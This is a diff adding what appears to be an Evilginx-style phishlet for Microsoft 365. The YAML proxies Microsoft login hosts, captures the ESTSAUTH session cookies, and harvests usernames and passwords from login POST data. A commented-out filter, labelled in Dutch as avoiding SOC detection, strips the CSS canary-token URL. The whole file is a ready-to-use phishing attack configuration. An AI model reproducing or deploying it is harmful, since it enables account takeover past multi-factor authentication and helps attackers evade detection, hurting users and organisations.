@@ -1,0 +1,33 @@
+name: 'Microsoft 365 - Enterprise'
+min_ver: '3.2.0'
+redirect_url: 'https://m365.cloud.microsoft/search/'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}
+
+# Custom CSS Canary token filter (voorkomt mogelijk detectie door een SOC)
+#sub_filters:
+#  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"customCssUrl":".*?"', replace: '"customCssUrl":""', mimes: ['application/json']}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH' , 'ESTSAUTHPERSISTENT' , 'SignInStateCookie']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/?auth=2&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&response_mode=form_post&nonce=639064042217516324.ZTY1MjJhZDctZjMzZC00ZWE4LTlhMzEtMTQ5MTkxNTM0ZTU3OWU5YTViNDgtZjdjZS00NzU1LWE1MjYtMTQ5MTkzZTJlOTcz'
